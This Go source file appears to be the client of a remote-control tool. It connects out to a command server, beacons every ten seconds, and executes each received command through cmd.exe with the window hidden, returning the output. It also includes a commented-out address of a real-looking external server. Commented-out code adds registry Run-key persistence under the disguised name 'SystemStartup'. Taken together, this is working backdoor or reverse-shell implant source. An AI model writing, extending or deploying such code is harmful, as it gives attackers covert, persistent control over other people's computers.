package main

import (
	"encoding/gob"
	"fmt"
	"go_remote_control/base"
	"log"
	"net"
	"os/exec"
	"runtime"
	"syscall"
	"time"
)

const (
	CommandServerIP   = "127.0.0.1" //命令服务连接IP
	CommandServerPort = "9901"      //命令服务连接端口
)

var (
	RuntimeEnvironment string
)

type CommandServer struct {
	base.Node
}

func (cs *CommandServer) handleCommand() {
	for {
		msg := <-cs.ReadChan
		cmd := msg.Content.(string)
		log.Print("Command:", cmd, "\n")
		content := execCommand(cmd)
		//写入回应
		res := base.Message{
			Type:       "res",
			CreateTime: time.Now(),
			ModifyTime: time.Now(),
			Src:        cs.Addr,
			Dst:        msg.Src,
			Content:    content,
			Log:        nil,
		}
		cs.WriteChan <- res
	}
}

func (cs *CommandServer) keepAlive() {
	for {
		msg := base.Message{
			Type:       "alive",
			CreateTime: time.Now(),
			ModifyTime: time.Now(),
			Src:        cs.Addr,
			Dst:        "",
			Content:    cs.Addr + "alive",
			Log:        nil,
		}
		cs.WriteChan <- msg
		time.Sleep(10 * time.Second)
	}
}

func init() {
	RuntimeEnvironment = runtime.GOOS //获取当前运行的系统环境
	switch RuntimeEnvironment {
	case "windows":
		//隐藏终端窗口
	//修改注册表实现开机自动启动
	//keyName := `HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Run` //自启动注册表路径
	//valueName := `SystemStartup`                                                  //伪装注册表名
	//regType := `REG_SZ`
	//regData, _ := os.Executable()
	//go execCommand(fmt.Sprintf(`reg add %s /v %s /t %s /d "%s"`, keyname, valuename, regtype, regdata))
	case "linux":

	case "darwin":

	}

}

func getConn() net.Conn {
	for {
		//conn, err := net.Dial("tcp", "42.192.69.243:6666")
		conn, err := net.Dial("tcp", CommandServerIP+":"+CommandServerPort)
		if err != nil {
			fmt.Println("连接失败 Error=", err)
			continue
		}
		time.Sleep(10 * time.Second)
		return conn
	}
}
func main() {

	conn := getConn()
	defer conn.Close()

	commandServer := CommandServer{
		Node: base.Node{
			Conn:      conn,
			Addr:      conn.LocalAddr().String(),
			ReadChan:  make(chan base.Message),
			WriteChan: make(chan base.Message),
			Enc:       gob.NewEncoder(conn),
			Dec:       gob.NewDecoder(conn),
		},
	}
	//开启读写通道并处理命令
	go commandServer.Read()
	go commandServer.Write()
	go commandServer.handleCommand()
	go commandServer.keepAlive()

	select {}
}

func execCommand(cmdLine string) string {
	switch RuntimeEnvironment {
	case "windows":
		switch cmdLine {
		case "download":
		default:
			cmd := exec.Command("cmd.exe")
			log.Printf(`/c %s`, cmdLine)
			//核心点,直接修改执行命令方式
			cmd.SysProcAttr = &syscall.SysProcAttr{CmdLine: fmt.Sprintf(`/c %s`, cmdLine), HideWindow: true}
			result, err := cmd.Output()
			if err != nil {
				log.Printf("error: %+v\n", err)
				return "Error:" + err.Error()
			}
			log.Printf("Result:\n%s", result)
			return string(result)
		}
	case "linux":

	case "darwin":

	default:

	}
	return ""
}
